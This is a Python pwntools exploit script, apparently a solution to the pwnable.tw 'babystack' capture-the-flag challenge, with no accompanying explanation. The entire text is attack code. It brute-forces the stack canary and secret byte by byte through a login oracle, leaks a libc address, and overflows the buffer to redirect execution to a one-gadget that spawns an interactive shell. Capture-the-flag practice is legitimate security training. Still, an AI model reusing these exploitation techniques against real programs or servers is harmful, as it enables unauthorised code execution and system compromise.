from pwn import *

#s = process("/root/babystack")
s = remote("chall.pwnable.tw",10205)

def get_urandom(f,n):
	result = ""+f
	for i in range(n):
		for j in range(255,1,-1):
			s.recvuntil(">> ")
			s.sendline("1")
			s.recv(1024)
			s.sendline(result + p8(j))
			r = s.recv(4)
			if r=="Logi":
				print "Find [%d]"%(i+1)
				result += p8(j)
				break
	return result


print "[+] Find urandom"
urandom = get_urandom("",16)

s.recvuntil(">> ")
s.sendline("1")
s.recvuntil(">> ")
s.sendline("1")
s.recv(1024)
payload = p32(0) + "a"*(0x40-4) + urandom + "a"*0x18
s.send(payload)

s.recvuntil(">> ")
s.sendline("3")
s.recv(1024)
s.send("a"*0x3f)

print "[+] Leak libc"
s.recvuntil(">> ")
s.sendline("1")
leak = get_urandom(urandom+"\x31\x0a"+"a"*(0x18-2),6)
leak = u64(leak[-6:]+"\x00\x00")
libc_base = leak - 0x000000000006F7FA 
libc_onegadget = libc_base + 0xf0567
print "libc_base : "+hex(libc_base)

s.recvuntil(">> ")
s.sendline("1")
s.recvuntil(">> ")
s.sendline("1")
s.recv(1024)
payload = p32(0) + "a"*(0x40-4) + urandom + "a"*0x18 + p64(libc_onegadget)
s.send(payload)

s.recvuntil(">> ")
s.sendline("3")
s.recv(1024)
s.send("a"*0x3f)

s.recvuntil(">> ")
s.sendline("2")
s.interactive()